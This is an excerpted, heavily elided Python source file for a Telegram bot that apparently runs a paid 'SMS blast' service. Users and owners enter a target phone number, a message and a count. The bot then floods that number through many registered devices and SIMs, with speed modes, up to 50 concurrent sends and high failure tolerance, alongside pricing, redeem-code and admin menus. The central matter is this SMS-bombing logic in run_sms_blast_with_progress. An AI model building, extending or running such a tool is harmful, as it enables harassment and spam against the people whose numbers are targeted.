...
def cancel_kb(callback: str) -> InlineKeyboardMarkup:
    """Return a keyboard with a single red Cancel button."""
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("ᴄᴀɴᴄᴇʟ", callback, EMOJI_CROSS, "❌", style="danger")]
    ])
...
async def fb_put(base_url: str, path: str, payload: dict) -> bool:
    """Send PUT request with retry and timeout."""
    url = base_url.rstrip("/") + path
    for attempt in range(3):  # retry up to 3 times
        try:
            async with aiohttp.ClientSession() as s:
                async with s.put(url, json=payload, timeout=aiohttp.ClientTimeout(total=3)) as r:
                    if 200 <= r.status < 300:
                        return True
        except Exception as e:
...
async def user_send_start(cq: CallbackQuery, state: FSMContext):
    ...
    await cq.message.edit_text(
        ...
        reply_markup=cancel_kb("user:home"),
        parse_mode="HTML"
    )
...
async def user_got_number(msg: Message, state: FSMContext):
    ...
    await msg.answer(
        ...
        reply_markup=cancel_kb("user:cancel"),
        parse_mode="HTML"
    )
...
async def owner_send_start(cq: CallbackQuery, state: FSMContext):
    ...
    await cq.message.edit_text(
        ...
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=cancel_kb("owner:home"),
        parse_mode="HTML"
    )
...
# ===== MODIFIED: run_sms_blast_with_progress with improved speed, concurrency, and cooldown =====
async def run_sms_blast_with_progress(bot: Bot, msg: Message, uid: int, number: str, message: str, count: int, devices: list, speed: float = SPEED_DEFAULT):
    ...
    # Map speed to concurrency and label
    speed_label_display = "🚀 FAST" if speed == SPEED_FAST else "⚡ MEDIUM" if speed == SPEED_MEDIUM else "🐢 SLOW"
    # concurrency = 30 if speed == SPEED_FAST else 15 if speed == SPEED_MEDIUM else 5
    # Use all devices at once; concurrency will be limited by number of tasks
    ...
    failed_attempts = 0
    MAX_FAILED_ATTEMPTS = 100  # increased tolerance
    ...
    async def do_send():
        nonlocal sent_ok, sent_fail, msgs_left, failed_attempts, last_update_time
        # Build list of all possible (device, sim) targets
        all_targets = []
        ...
        random.shuffle(all_targets)  # load balance

        # If no targets, exit with error
        if not all_targets:
            log.error(f"No valid targets (devices/sims) for user {uid}")
            await progress_msg.edit_text(
        ...
        # Set concurrency limit: use all targets but cap to avoid overloading
        concurrency_limit = min(len(all_targets), 50)  # max 50 concurrent sends
        ...
        while msgs_left > 0 and not session.cancelled and target_index < total_targets:
            ...
            async with session.lock:
                ...
                msgs_left -= batch_sent
                # Track API usage per firebase (approximate)
                for fb_url, dev_id, sim in batch_targets:
                    # We don't have per-target success, but we can count overall
                    pass
                # For simplicity, we'll add total sent/failed per Firebase later based on overall? 
                # We'll just aggregate totals; per-firebase stats can be approximated by dividing.
                # We'll update api_usage_delta with total sent/failed for all FB.
    ...
    if not is_regular_user:
        ...
        # For api_usage, we'll just add totals (no per-device)
...
async def owner_videos_add_start(cq: CallbackQuery, state: FSMContext):
    ...
    await cq.message.edit_text(
        ...
        reply_markup=cancel_kb("owner:videos:menu"),
        parse_mode="HTML"
    )
...
async def owner_fb_add_start(cq: CallbackQuery, state: FSMContext):
    ...
    await cq.message.edit_text(
        ...
        reply_markup=cancel_kb("owner:fb:menu:0"),
        parse_mode="HTML"
    )
...
async def owner_owners_add_start(cq: CallbackQuery, state: FSMContext):
    ...
    await cq.message.edit_text(
        ...
        reply_markup=cancel_kb("owner:owners:menu"),
        parse_mode="HTML"
    )
...
async def owner_admins_add_start(cq: CallbackQuery, state: FSMContext):
    ...
    await cq.message.edit_text(
        ...
        reply_markup=cancel_kb("owner:admins:menu"),
        parse_mode="HTML"
    )
...
async def owner_fj_add_start(cq: CallbackQuery, state: FSMContext):
    ...
    await cq.message.edit_text(
        ...
        reply_markup=cancel_kb("owner:fj:menu"),
        parse_mode="HTML"
    )
...
async def owner_pricing_add_start(cq: CallbackQuery, state: FSMContext):
    ...
    await cq.message.edit_text(
        ...
        reply_markup=cancel_kb("owner:pricing:menu"),
        parse_mode="HTML"
    )
...
async def owner_redeem_gen_start(cq: CallbackQuery, state: FSMContext):
    ...
    await cq.message.edit_text(
        ...
        reply_markup=cancel_kb("owner:redeem:menu"),
        parse_mode="HTML"
    )
...
async def owner_settings_ref(cq: CallbackQuery, state: FSMContext):
    ...
    await cq.message.edit_text(
        ...
        reply_markup=cancel_kb("owner:settings"),
        parse_mode="HTML"
    )
